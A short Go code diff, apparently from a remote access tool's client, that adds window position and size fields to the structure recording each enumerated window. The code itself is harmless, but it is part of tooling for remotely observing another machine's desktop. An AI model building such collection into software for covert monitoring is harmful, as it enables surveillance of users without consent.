@@ -9,10 +9,18 @@ import (
 	"rat/client/utils"
 )
 
+type Rect struct {
+	X      int
+	Y      int
+	Width  int
+	Height int
+}
+
 // Window struct exposed to Go
 type Window struct {
 	Handle int
 	Title  string
+	Rect   Rect
 }
 
 // Windows array, will be populated after call to QueryWindows()
@@ -26,6 +34,12 @@ func Callback(w C.Window) {
 	window := Window{
 		Handle: int(w.handle),
 		Title:  title,
+		Rect: Rect{
+			int(w.rect.x),
+			int(w.rect.y),
+			int(w.rect.width),
+			int(w.rect.height),
+		},
 	}
 
 	Windows = append(Windows, window)
